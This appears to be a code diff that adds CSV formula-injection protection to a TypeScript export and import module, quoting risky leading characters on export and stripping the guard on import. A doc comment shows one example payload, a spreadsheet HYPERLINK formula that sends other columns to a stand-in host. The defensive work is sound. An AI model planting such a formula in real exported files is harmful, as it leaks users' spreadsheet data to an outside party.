@@ -292,20 +292,48 @@ export function parseCSV(csv: string): CsvResult {
     // column count still reported 3. This file already gets it right in subst() (hasOwnProperty
     // check); this was the one place that opted out.
     const rec = Object.create(null) as TemplateRecord;
-    headers.forEach((h, j) => (rec[h] = values[j]));
+    // Strip the guard toCSV adds, so a file exported by this app reads back with the value the user
+    // typed rather than with a leading quote they never wrote.
+    headers.forEach((h, j) => (rec[h] = stripFormulaGuard(values[j])));
     records.push(rec);
   }
   return { headers, records, errors };
 }
 
+/**
+ * Neutralise a spreadsheet formula.
+ *
+ * Excel, LibreOffice and Google Sheets all treat a cell whose text begins with = + - @ (or tab,
+ * carriage return) as a formula, not as text. A cell like
+ * `=HYPERLINK("http://evil.example/?"&A1,"click")` therefore becomes a live link when the exported
+ * file is opened, and it can read other columns of the same file and send them in the query string.
+ *
+ * Template rows can arrive from an imported design file, so the value that ends up in a cell is not
+ * necessarily the user's own typing. Prefixing a single quote is the spreadsheet convention for
+ * "this is text": Excel and LibreOffice do not display the quote, and it is what their own CSV
+ * exporters emit. toCSV's counterpart on import strips it again, so a round trip is lossless.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+/** Escape a cell for CSV, neutralising a leading formula character. */
+export function csvCell(value: unknown): string {
+  const v = value === null || value === undefined ? '' : String(value);
+  const safe = FORMULA_LEAD.test(v) ? `'${v}` : v;
+  return /[",\n\r]/.test(safe) ? '"' + safe.replace(/"/g, '""') + '"' : safe;
+}
+
+/** Remove the guard csvCell added, so an exported-then-imported file reads back unchanged. */
+export function stripFormulaGuard(value: string): string {
+  return value.startsWith("'") && FORMULA_LEAD.test(value.slice(1)) ? value.slice(1) : value;
+}
+
 export function toCSV(headers: string[], records: TemplateRecord[]): string {
-  const esc = (v: string) => (/[",\n\r]/.test(v) ? '"' + v.replace(/"/g, '""') + '"' : v);
   // `r[h] || ''` turned a legitimate 0 into an empty cell, so a quantity column exported blanks for
   // every zero row and a round-trip lost the data. Only null/undefined/'' are genuinely empty; 0 and
   // false are values.
-  const cell = (v: unknown) => (v === null || v === undefined ? '' : String(v));
+  const esc = (v: string) => (/[",\n\r]/.test(v) ? '"' + v.replace(/"/g, '""') + '"' : v);
   return [
     headers.map(esc).join(','),
-    ...records.map((r) => headers.map((h) => esc(cell(r[h]))).join(',')),
+    ...records.map((r) => headers.map((h) => csvCell(r[h])).join(',')),
   ].join('\n');
 }
